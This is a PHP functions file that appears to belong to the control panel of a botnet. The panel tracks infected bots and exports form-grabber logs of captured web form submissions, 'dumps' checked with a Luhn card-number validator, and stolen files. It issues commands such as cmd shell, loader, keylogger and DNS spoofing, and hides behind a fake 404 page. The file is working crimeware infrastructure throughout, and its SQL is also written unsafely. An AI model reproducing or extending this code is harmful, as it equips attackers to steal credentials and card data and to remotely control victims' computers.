<?php
if (!defined('N3N')) {
    include_once __DIR__ . '/config.php';
}

function isGrabberBlacklist($blacklist, $client_host)
{
    $client_host_decoded = base64_decode($client_host);
    if ($blacklist) {
        $blacklisted_hostnames_array = preg_split('/\n|,|\r\n?/', $blacklist);
        $block_count = count($blacklisted_hostnames_array);

        for ($i = 0; $i < $block_count; $i++) {
            if (fnmatch($blacklisted_hostnames_array[$i], $client_host_decoded)) {
                return true;
            }
        }
    }
    return false;
}

function isGrabberWhitelist($whitelist, $client_host)
{
    if ($whitelist == 'capture_all') {
        return true;
    } else {

        $client_host_decoded = base64_decode($client_host);
        $whitelisted_hostnames_array = preg_split('/\n|,|\r\n?/', $whitelist);
        $white_count = count($whitelisted_hostnames_array);

        for ($i = 0; $i < $white_count; $i++) {
            if (fnmatch($whitelisted_hostnames_array[$i], $client_host_decoded)) {
                return true;
            }
        }
    }
    return false;
}

function ShowFlag($countrycode, $altext = null)
{
    if ($countrycode == 'ALL')
        return '<span class="glyphicon glyphicon-globe" title="All countries" style="cursor: default;"></span></a>';
    if (strlen($countrycode) < 5)
        return '<img style="margin: 0px 0px 3px 0px;padding:0;border:0;" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="flag flag-' . strtolower($countrycode) . '" alt="' . $altext . '" title="' . $altext . '">';
    else
        return $countrycode;
}

function iError(mysqli $mysqli)
{
    ?>
    <link href="css/custom.css" rel="stylesheet" media="screen">
    <div class="panel panel-danger" style="width: 25%;margin: 0 auto;">
        <div class="panel-heading">
            <h3 class="panel-title">Error!</h3>
        </div>
        <div class="panel-body"> Connect Error
            - <?php echo $mysqli->connect_errno . '<br>' . $mysqli->connect_error ?></div>
    </div>
    <?php
    exit;
}

function ConnectMySQLi($host, $login, $password, $database)
{
    $mysqli = new mysqli($host, $login, base64_decode($password), $database);
    if ($mysqli->connect_error)
        iError($mysqli);
    return $mysqli;
}

function Alert($text)
{
    echo '<script>bootbox.alert("' . $text . '");</script>';
}

function MessageRedirect($link, $text = null)
{
    echo "<script>";
    if (!is_null($text))
        echo 'bootbox.alert("' . $text . '");';
    if (!is_null($link))
        echo "location=\"$link\";";
    echo "</script>";
}

function QueryRedirect(mysqli $mysqli, $command, $link)
{
    $mysqli->query($command);
    echo '<script>location="' . $link . '";</script>';
}

function QueryMessageRedirect(mysqli $mysqli, $command, $text, $link)
{
    if ($mysqli->query($command))
        MessageRedirect($link, $text);
    else
        MessageRedirect($link, "<b>Error! </b><br>" . $mysqli->error);
}

function WarningBox($text)
{
    ?>
    <div class="panel panel-warning" style="width: 25%;margin: 0 auto;">
        <div class="panel-heading">
            <h3 class="panel-title">Warning</h3>
        </div>
        <div class="panel-body">
            <?php echo $text; ?>
        </div>
    </div>
    <?php
}

function CmdParser($cmd)
{
    $cmd_str = explode('#', $cmd);
    $echo_cmd = $cmd_str[1];
    return $echo_cmd;
}

function NotFound($text = null)
{
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");

    global $is_nginx;
    if ($is_nginx) {
        $not_found_msg =
            '<html>' . PHP_EOL
            . '<head><title>404 Not Found</title></head>' . PHP_EOL
            . '<body bgcolor="white">' . PHP_EOL
            . '<center><h1>404 Not Found</h1></center>' . PHP_EOL
            . '<hr><center>' . $_SERVER['SERVER_SOFTWARE'] . '</center>' . PHP_EOL
            . '</body>' . PHP_EOL
            . '</html>' . PHP_EOL;
    } else {
        $not_found_msg = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . PHP_EOL
            . '<html><head>' . PHP_EOL
            . '<title>404 Not Found</title>' . PHP_EOL
            . '</head><body>' . PHP_EOL
            . '<h1>Not Found</h1>' . PHP_EOL
            . '<p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>' . PHP_EOL
            . '<p>Additionally, a 404 Not Found' . PHP_EOL
            . 'error was encountered while trying to use an ErrorDocument to handle the request.</p>' . PHP_EOL
            . '</body></html>';
    }

    $hide_text = !empty($text) ? '<!---' . base64_encode($text) . '--->' : '';
    die($not_found_msg . $hide_text);
}

function CheckGuest()
{
    global $key_tologin;

    $cookie_key = isset($_COOKIE['authkey']) ? $_COOKIE['authkey'] : 0;
    $request_key = isset($_GET['authkey']) ? md5($_GET['authkey']) : 0;

    if (!$cookie_key && !$request_key) {
        return false;
    } else if (strcasecmp($cookie_key, $key_tologin) == 0) {
        return true;
    } else if (strcasecmp($request_key, $key_tologin) == 0) {
        setcookie('authkey', $request_key, time() + (60 * 60 * 24) * 30);
        return true;
    } else {
        return false;
    }
}

function AddBan(mysqli $mysqli, $ip_id, $reason)
{
    $config_ban_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "ban_enabled"')->fetch_object()->config_value ? 1 : 0;
    if (!$config_ban_state) {
        return;
    }

    $add_ban_ip_id = $mysqli->query('SELECT * FROM ' . DB_BAN . ' WHERE client_id_ip = "' . $ip_id . '" LIMIT 1')->fetch_row();
    $add_ban_referrer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : '';
    $add_ban_useragent = array_key_exists('HTTP_USER_AGENT', $_SERVER) ? $_SERVER['HTTP_USER_AGENT'] : '';

    if (empty($add_ban_ip_id)) {

        $ban_date = date('Y-m-d H:i:s');
        $add_ban_hash = md5($ip_id);
        $mysqli->query("REPLACE INTO " . DB_BAN . " (client_id_ip, client_useragent, client_referrer, client_ban_reason, client_ban_date_time, client_ban_hash)
        VALUES ('$ip_id', '$add_ban_useragent', '$add_ban_referrer', '$reason', '$ban_date', '$add_ban_hash')");
    }
}

function compress($path, $out, $handle = false, $recursive = false)
{
    if (!is_dir($path) and !is_file($path))
        return false;

    if (!$handle) {
        $handle = new ZipArchive;
        if ($handle->open($out, ZipArchive::CREATE) === false) {
            return false;
        }
    }

    if (is_dir($path)) {
        $path = dirname($path . '/arch.ext');
        $handle->addEmptyDir($path);
        foreach (glob($path . '/*') as $url) {
            compress($url, $out, $handle, true);
        }

    } else {
        $handle->addFile($path);
    }

    if (!$recursive)
        $handle->close();

    return true;
}

function zip_sql($source, $destination, mysqli $mysqli, $db)
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));
    if (is_dir($source) == true) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = str_replace('\\', '/', $file);
            if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..')))
                continue;

            $file = realpath($file);
            if (is_dir($file) == true) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if (is_file($file) == true) {
                $result = $mysqli->query('SELECT * FROM ' . $db . '  WHERE client_file_hash="' . basename($file) . '"');
                if ($result != false && $result->num_rows > 0) {
                    $row = $result->fetch_assoc();
                    $filename = $row['client_file_hash'] . '_' . $row['client_file_path'];
                    $zip->addFromString(str_replace($source . '/', '', $filename), file_get_contents($file));
                }
            }
        }
    } else if (is_file($source) == true) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

function EncodeCommand($command)
{
    switch (strtolower($command)) {
        case 'start proxy':
            return 'PROXY';
            break;
        case 'find file':
            return 'FIND';
            break;
        case 'cmd shell':
            return 'CMD';
            break;
        case 'cmd shell (with results)':
            return 'CMD-Result';
            break;
        case 'find process':
            return 'FINDPROC';
            break;
        case 'update':
            return 'UPDATE';
            break;
        case 'loader':
            return 'LOADER';
            break;
        case 'plugin':
            return 'PLUGIN';
            break;
        case 'dns spoofing':
            return 'DNS';
            break;
		case 'keylogger':
            return 'KEYLOG';
            break;
        default:
            return 'FAIL';
    }
}

function GetSmallStat($bots_online, $bots_offline, $bots_hour, $bots_day, $bots_total, $bots_banned)
{
    echo '<div style="text-align:center; width:100%"><ul class="breadcrumb">'
        . ' Online bots :  <span class="badge">' . $bots_online . '</span>'
        . ' Offline bots : <span class="badge">' . $bots_offline . '</span>'
        . ' Hour bots : <span class="badge">' . $bots_hour . '</span>'
        . ' Today bots : <span class="badge">' . $bots_day . '</span>'
        . ' Total bots : <span class="badge">' . $bots_total . '</span>'
        . '<a href="?act=settings&do=blacklist"> Banned ip : <span class="badge badge-important"> ' . $bots_banned . ' </span></a>'
        . '</ul></div>';
}

function DeleteAll($dirname)
{
    $dir_handle = opendir($dirname);
    if ($dir_handle) {
        while (false !== ($file = readdir($dir_handle))) {
            $filename = $dirname . '/' . $file;
            if (file_exists($filename)) {
                if ($file != '.' && $file != '..' && $file != 'index.html' && $file != 'index.php' && $file != '.htaccess') {
                    unlink($filename);
                }
            }
        }
        closedir($dir_handle);
    }
}

function GetPagination($current_page, $str, $pages_count)
{
    if ((int)$pages_count === 0) {
        return;
    }

    $_prev_page = null;
    $_next_page = null;

    $page1left = null;
    $page2left = null;

    $page1right = null;
    $page2right = null;

    echo '<div style="text-align: center">'
        . '<ul class="pagination pagination-sm">';

    if ($current_page > 1) {
        $_prev_page = '<li><a href= ./?' . $str . 'page=0> << </a></li>';
    }

    if ($current_page != $pages_count) {
        $_next_page = '<li><a href= ./?' . $str . 'page=' . $pages_count . '> >> </a></li>';
    }

    if ($current_page - 2 > 0) {
        $page2left = ' <li ><a href= ./?' . $str . 'page=' . ($current_page - 2) . '>' . ($current_page - 2) . '</a></li>  ';
    }

    if ($current_page > 0) {
        $page1left = ' <li ><a href= ./?' . $str . 'page=' . ($current_page - 1) . '>' . ($current_page - 1) . '</a></li> ';
    }

    if ($current_page + 2 <= $pages_count) {
        $page2right = '  <li><a href= ./?' . $str . 'page=' . ($current_page + 2) . '>' . ($current_page + 2) . '</a></li>';
    }

    if ($current_page + 1 <= $pages_count) {
        $page1right = '  <li><a href= ./?' . $str . 'page=' . ($current_page + 1) . '>' . ($current_page + 1) . '</li></a>';
    }

    echo $_prev_page . $page2left . $page1left . '<li class="active"><a>' . $current_page . '</a></li>' . $page1right . $page2right . $_next_page;
    echo '</ul></div>';
}

function my_substr($text, $len)
{
    if (strlen($text) > $len) {
        $string = substr($text, 0, $len);
        $string .= '...';
        return $string;
    }
    return $text;
}

function ExportGrabberLogs(mysqli $mysqli, $filter)
{
    global $_main_url;

    $total_rows = fast_count_sql($mysqli, 'SELECT * FROM ' . DB_GRABBER . ';');
    if ($total_rows <= 0) {
        return;
    }

    $grabber_export_filename = './upload/grabber-export(' . date('Y-m-d_H-i-s') . ').txt';
    $fg_file = fopen($grabber_export_filename, 'a');
    if ($fg_file == false) {
        return;
    }

    $page = 0;
    $per_write = 1000;
    $num_out = ceil($total_rows / $per_write);

    for ($i = 1; $i <= $num_out; $i++) {
        $start = abs($page * $per_write);
        $res = $mysqli->query($filter . " LIMIT $start, $per_write");
        while ($row = $res->fetch_array()) {
            $buffer = str_replace('&', PHP_EOL, urldecode(base64_decode($row['client_form'])));
            $grabber_export =
                '====================================' . PHP_EOL
                . 'Machine id : ' . $row['client_id'] . PHP_EOL
                . 'Machine IP : ' . $row['client_ip'] . PHP_EOL
                . 'Host : ' . base64_decode($row['client_host']) . PHP_EOL
                . 'Date : ' . $row['client_date'] . PHP_EOL
                . 'Browser : ' . $row['client_browser'] . PHP_EOL
                . 'Form : ' . PHP_EOL . $buffer . PHP_EOL;
            fwrite($fg_file, $grabber_export . PHP_EOL);
        }
        $page++;
    }
    fclose($fg_file);

    $file_path = $_main_url;

    if (compress($grabber_export_filename, $grabber_export_filename . '.zip', false) != false) {
        $file_path .= $grabber_export_filename . '.zip';
        $file = iconv('utf-8', 'cp1251', $grabber_export_filename);
        @unlink($file);
    } else {
        $file_path .= $grabber_export_filename;
    }

    echo '<script>ReloadPage("Export succesfully!<br>File moved to - \'Upload\'<br><b>Direct link - <a href = \'' . $file_path . '\' title=\'Download\'>' . $file_path . '</a>", "' . PAGE_GRABBER . '");</script>';
}

function ExportDumps(mysqli $mysqli)
{
    global $_main_url;

    $total_rows = fast_count_sql($mysqli, 'SELECT * FROM ' . DB_DUMPS . ';');
    if ($total_rows <= 0) {
        return;
    }

    $dumps_export_filename = 'upload/dumps-export(' . date('Y-m-d_H-i-s') . ').txt';
    $fd_file = fopen($dumps_export_filename, 'a');
    if ($fd_file == false) {
        return;
    }

    $page = 0;
    $per_write = 1000;

    $num_out = ceil($total_rows / $per_write);
    for ($i = 1; $i <= $num_out; $i++) {
        $start = abs($page * $per_write);

        $res = $mysqli->query('SELECT * FROM ' . DB_DUMPS . ' LIMIT ' . $start . ', ' . $per_write . ';');
        while ($row = $res->fetch_array()) {
            $dumps_export =
                'Machine id : ' . $row['client_id'] . PHP_EOL
                . 'Machine IP : ' . $row['client_ip'] . PHP_EOL
                . 'Date/time : ' . $row['client_date'] . PHP_EOL
                . 'Data : ' . base64_decode($row['client_data']) . PHP_EOL
                . '====================================' . PHP_EOL;
            fwrite($fd_file, $dumps_export);
        }
        $page++;
    }
    fclose($fd_file);

    $file_path = $_main_url;
    if (compress($dumps_export_filename, $dumps_export_filename . '.zip', false) != false) {
        $file_path .= $dumps_export_filename . '.zip';
        $file = iconv('utf-8', 'cp1251', $dumps_export_filename);
        @unlink($file);
    } else
        $file_path .= $dumps_export_filename;
    echo '<script>ReloadPage("Export succesfully!<br>File moved to - \'Upload\'<br><b>Direct link - <a href = \'' . $file_path . '\' title=\'Download\'>' . $file_path . '</a>", "' . PAGE_DUMPS . '");</script>';
}

function ExportLogs(mysqli $mysqli)
{
    global $_main_url;

    $total_rows = fast_count_sql($mysqli, 'SELECT * FROM ' . DB_LOGS . ';');
    if ($total_rows <= 0) {
        return;
    }

    $logs_export_filename = 'upload/logs-export(' . date('Y-m-d_H-i-s') . ').txt';
    $logs_file = fopen($logs_export_filename, 'a');
    if ($logs_file == false) {
        return;
    }

    $page = 0;
    $per_write = 1000;

    $num_out = ceil($total_rows / $per_write);
    for ($i = 1; $i <= $num_out; $i++) {
        $start = abs($page * $per_write);

        $res = $mysqli->query('SELECT * FROM ' . DB_LOGS . ' LIMIT ' . $start . ', ' . $per_write . ';');
        while ($row = $res->fetch_array()) {
            $logs_export =
                'Machine id : ' . $row['client_id'] . PHP_EOL
                . 'Machine IP : ' . $row['client_ip'] . PHP_EOL
                . 'Date/time : ' . $row['client_event_date'] . PHP_EOL
                . 'Name : ' . $row['client_event_name'] . PHP_EOL
                . 'Data : ' . $row['client_event_text'] . PHP_EOL
                . '====================================' . PHP_EOL;
            fwrite($logs_file, $logs_export);
        }
        $page++;
    }
    fclose($logs_file);

    $file_path = $_main_url;
    if (compress($logs_export_filename, $logs_export_filename . '.zip', false) != false) {
        $file_path .= $logs_export_filename . '.zip';
        $file = iconv('utf-8', 'cp1251', $logs_export_filename);
        @unlink($file);
    } else
        $file_path .= $logs_export_filename;
    echo '<script>ReloadPage("Export succesfully!<br>File moved to - \'Upload\'<br><b>Direct link - <a href = \'' . $file_path . '\' title=\'Download\'>' . $file_path . '</a>", "' . PAGE_LOGS . '");</script>';
}

function ExportPlugin(mysqli $mysqli)
{
    global $_main_url;

    $total_rows = fast_count_sql($mysqli, 'SELECT * FROM ' . DB_PLUGIN . ';');
    if ($total_rows <= 0) {
        return;
    }

    $plugin_export_filename = 'upload/plugin-export(' . date('Y-m-d_H-i-s') . ').txt';
    $plugin_file = fopen($plugin_export_filename, 'a');
    if ($plugin_file == false) {
        return;
    }

    $page = 0;
    $per_write = 1000;

    $num_out = ceil($total_rows / $per_write);
    for ($i = 1; $i <= $num_out; $i++) {
        $start = abs($page * $per_write);

        $res = $mysqli->query('SELECT * FROM ' . DB_PLUGIN . ' LIMIT ' . $start . ', ' . $per_write . '');
        while ($row = $res->fetch_array()) {
            $plugin_export =
                'Machine id : ' . $row['client_id'] . PHP_EOL
                . 'Machine IP : ' . $row['client_ip'] . PHP_EOL
                . 'Date/time : ' . $row['client_event_date'] . PHP_EOL
                . 'Name : ' . $row['client_event_name'] . PHP_EOL
                . 'Data : ' . $row['client_event_text'] . PHP_EOL
                . '====================================' . PHP_EOL;
            fwrite($plugin_file, $plugin_export);
        }
        $page++;
    }
    fclose($plugin_file);

    $file_path = $_main_url;
    if (compress($plugin_export_filename, $plugin_export_filename . '.zip', false) != false) {
        $file_path .= $plugin_export_filename . '.zip';
        $file = iconv('utf-8', 'cp1251', $plugin_export_filename);
        @unlink($file);
    } else
        $file_path .= $plugin_export_filename;
    echo '<script>ReloadPage("Export succesfully!<br>File moved to - \'Upload\'<br><b>Direct link - <a href = \'' . $file_path . '\' title=\'Download\'>' . $file_path . '</a>", "' . PAGE_PLUGIN . '");</script>';
}

function GetRealIP()
{
    $real_ip = null;
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $real_ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $real_ip = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));
    } else {
        $real_ip = $_SERVER['REMOTE_ADDR'];
    }

    if (isset($_COOKIE['ip'])) {
        if (filter_var($_COOKIE['ip'], FILTER_VALIDATE_IP)) {
            $real_ip = $_COOKIE['ip'];
        }
    }
    return $real_ip;
}

function is_func_enabled($function)
{
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array($function, $disabled);
}

function mysql_v()
{
    $output = shell_exec('mysql -V');
    if (!$output) {
        return null;
    }
    preg_match('@[0-9]+\.[0-9]+\.[0-9]+@', $output, $version);
    return $version[0];
}

function check_mysql($current)
{
    $min_version = '5.6.1';
    if (abs($min_version) <= abs($current)) {
        return true;
    }
    return false;
}

function ParseFiles(mysqli $mysqli, $dir)
{
    $sql = 'SELECT * FROM ' . DB_FILES . '';

    $is_search = isset($_GET['search']) ? $mysqli->real_escape_string($_GET['search']) : null;
    if ($is_search) {
        $sql .= ' WHERE client_file_path LIKE "%' . urldecode($is_search) . '%"';
    }

    $files_count = (int)$mysqli->query($sql)->num_rows;
    $pages_count = floor($files_count / PAGE_LIMIT);

    $current_page = array_key_exists('page', $_GET) ? (int)htmlspecialchars($_GET['page']) : 0;
    if ($current_page) {
        $sql .= ' LIMIT ' . floor($current_page * PAGE_LIMIT) . ', ' . PAGE_LIMIT . '';
    } else {
        $sql .= ' LIMIT 0, ' . PAGE_LIMIT . '';
    }

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = "";

    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }

    if ($is_search) {
        echo '<i>Founded - ' . $files_count . ' item(s)...</i>';
    }

    $start_page = abs($current_page * PAGE_LIMIT);
    $res = $mysqli->query($sql);

    if ($res && $res->num_rows != 0) {
        echo '<table class="table table-responsive table-striped table-condensed table-hover">'
            . '<th style="text-align: center">#</th>'
            . '<th><b>IP</th>'
            . '<th><b>ID</th>'
            . '<th><b>Name</th>'
            . '<th><b>Size</th>'
            . '<th style="text-align: left;"><b>Date</th>'
            . '<th style="text-align: center;"><b>Action</th>'
            . '<tbody>';

        for ($i = 0; $i < $res->num_rows; $i++) {
            $row = $res->fetch_assoc();

            if ($row['client_file_size'] >= 1024) {
                $fsstr = sprintf('%1.2f', $row['client_file_size'] / 1024) . ' KB';
            } else {
                $fsstr = $row['client_file_size'] . ' B';
            }

            echo '<tr class="active">'
                . '<td style="text-align: center"><b>' . $start_page . '</b></td>'
                . '<td style="width=15%">' . $row['client_ip'] . '</td>'
                . '<td style="width=20%"><a href = "?act=grabber&show_by_id=' . $row['client_id'] . '"title="Search this bot on statistics page">' . $row['client_id'] . '</a></td>'
                . '<td style="width=30%"><a href="download.php?file=' . $row['client_file_hash'] . '&dir=' . $dir . '&name=' . $row['client_file_path'] . '" title="Download file">' . $row['client_file_path'] . ' </a></td>'
                . '<td style="width=10%">' . $fsstr . '</td>'
                . '<td style="width=10%;  text-align: left;">' . $row['client_file_data'] . '</td>'
                . '<td style="width=20%; text-align: center;"><a href="download.php?file=' . $row['client_file_hash'] . '&dir=' . $dir . '&name=' . $row['client_file_path'] . '" title="Download file"><span class="glyphicon glyphicon-save"></span></a>'
                . '&nbsp;'
                . '<a href="?act=logs&do=' . $dir . '&client_file_hash=' . $row['client_file_hash'] . '&form=delete" title="Delete"><span class="glyphicon glyphicon-trash"></span></a></td>'
                . '</tr>';
            $start_page++;
        }
        echo '<tbody></table>';
        GetPagination($current_page, $str, $pages_count);
    } else {
        echo '<div style="margin: 0 auto;overflow: hidden;text-align: center"><b>No records in database!</b></div><br>';
    }
}

function ParseDb(mysqli $mysqli, $sql, $type)
{
    $search = isset($_GET['search']) ? htmlentities($mysqli->escape_string($_GET['search'])) : '';
    if ($search) {
        $sql .= " WHERE client_event_text LIKE '%" . $search . "%'";
    }

    $count = $mysqli->query($sql)->num_rows;
    $count_pages = intval($count / PAGE_LIMIT);

    $page = isset($_GET['page']) ? intval($_GET['page']) : 0;
    if ($page) {
        $lim = intval($page * PAGE_LIMIT);
        $sql .= ' LIMIT ' . $lim . ', ' . PAGE_LIMIT;
    } else {
        $sql .= ' LIMIT 0, ' . PAGE_LIMIT;
    }

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = "";

    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }

    if ($search) {
        echo '<i>Founded - ' . $count . ' item(s)...</i>';
    }

    $res = $mysqli->query($sql);
    $rows = $res->num_rows;
    if ($rows != 0) {
        echo '<table class="table table-responsive table-striped table-condensed table-hover">'
            . '<th style="text-align: center">#</th>'
            . '<th><b>IP</th>'
            . '<th><b>ID</th>'
            . '<th><b>Text</th>'
            . '<th style="text-align: left;"><b>Date</th>'
            . '<th style="text-align: center;"><b>Action</th>'
            . '<tbody>';

        for ($i = 0; $i < $rows; $i++) {
            $row = $res->fetch_assoc();

            echo '<tr><td style="width:1%"><b>' . $i . '</td>'
                . '<td style="width:5%"">' . $row['client_ip'] . '</td>'
                . '<td style="width:5%"><a href = "?act=clients&countries=ALL&client_id=' . $row['client_id'] . '" title="Show in statistics">' . $row['client_id'] . '</td>'
                . '<td style="width:50%">'
                . '<div class="input-group">'
                . ' <span class="input-group-addon">' . $row['client_event_name'] . '</span>'
                . '<input readonly class="form-control" type="text" value="' . $row['client_event_text'] . '">'
                . '</div>'
                . '</td>'
                . '<td style="width:10%">' . $row['client_event_date'] . '</td>'
                . '<td style="width:5%;text-align:center"><a href="?act=logs&do=' . $type . '&client_event_hash=' . $row['client_event_hash'] . '&form=delete" title="Delete"><span class="glyphicon glyphicon-trash"></span></a></td>';
        }
        echo '</tr></tbody></table>';
        GetPagination($page, $str, $count_pages);
    } else {
        echo '<div style="margin: 0 auto;overflow: hidden;text-align: center"><b>No records in database!</b></div><br>';
    }
}

function task_action(mysqli $mysqli, $task_id, $action)
{
    $sql = null;
    switch ($action) {
        case 'start':
            $sql = 'UPDATE ' . DB_TASKS . ' SET task_status= "1" WHERE task_id = "' . $task_id . '"';
            break;
        case 'stop':
            $sql = 'UPDATE ' . DB_TASKS . ' SET task_status= "0" WHERE task_id = "' . $task_id . '"';
            break;
        case 'repeat':
            $check = $mysqli->query('SELECT * FROM ' . DB_TASKS . ' WHERE task_id = "' . $task_id . '"')->fetch_assoc();
            if ($check) {
                $task_id_new = time() . mt_rand(111111, 999999);
                $task_need_exec = isset($check['task_need_execs']) ? $check['task_need_execs'] : '0';
                $sql = 'UPDATE ' . DB_TASKS . ' SET task_id = "' . $task_id_new . '", task_execs = "0", task_need_execs = "' . $task_need_exec . '", task_failed_execs = "0" WHERE task_id = "' . $task_id . '"';
            }
            break;
        case 'kill':
            $sql = 'DELETE FROM ' . DB_TASKS . ' WHERE task_id = "' . $task_id . '"';
            break;
        case 'start_all_tasks':
            $sql = 'UPDATE ' . DB_TASKS . ' SET task_status="1"';
            break;
        case 'stop_all_tasks':
            $sql = 'UPDATE ' . DB_TASKS . ' SET task_status="0"';
            break;
        case 'kill_all_tasks':
            $sql = 'truncate ' . DB_TASKS . '';
            break;
    }
    QueryRedirect($mysqli, $sql, PAGE_TASKS);
}

function fast_count_sql(mysqli $mysqli, $sql)
{
    $sql_counter_str = str_replace('SELECT *', 'SELECT COUNT(*)', $sql);
    $sql_counter = $mysqli->query($sql_counter_str)->fetch_array();
    return $sql_counter[0];
}

function AddUser(mysqli $mysqli, $login, $password, $type = 'user')
{
    $err = null;
    if (!preg_match("/^[a-zA-Z0-9]+$/", $login)) {
        $err .= "Username may only consist of letters of the alphabet and numbers.<br>";
    }

    if (strlen($login) < 3 or strlen($login) > 30) {
        $err .= "Username must be at least 3 characters and no more than 30.";
    }

    $sql = $mysqli->query('SELECT client_id FROM ' . DB_USERS . ' WHERE client_username = "' . $mysqli->real_escape_string($login) . '"')->num_rows;
    if ($sql > 0) {
        $err .= "Members with such login already exist in the database.";
    }

    if (strlen($err) == 0) {
        $password_md5 = md5(md5($password));
        if ($result = $mysqli->query('INSERT INTO ' . DB_USERS . ' SET client_username="' . $login . '", client_password = "' . $password_md5 . '", client_id = "' . $type . '"')) {
            return true;
        }
    } else {
        echo '<script type="text/javascript">bootbox.alert("<b>Add user error!</b><br>' . $err . '");</script>';
    }
    return false;
}

function LuhnCheck($number)
{
    $number = preg_replace('/\D/', '', $number);

    $number_length = strlen($number);
    $parity = $number_length % 2;

    $total = 0;
    for ($i = 0; $i < $number_length; $i++) {
        $digit = $number[$i];
        if ($i % 2 == $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $total += $digit;
    }
    return ($total % 10 == 0) ? true : false;

}

function GetConfig($file)
{
    $file_dat = $file . '.dat';
    if (!file_exists($file_dat) || filemtime($file_dat) <= filemtime($file)) {
        $r = include($file);
        if ($F = fopen($file_dat, "w")) {
            fwrite($F, serialize($r));
            fclose($F);
        }
    } else {
        $r = unserialize(file_get_contents($file_dat));
    }
    return $r;
}
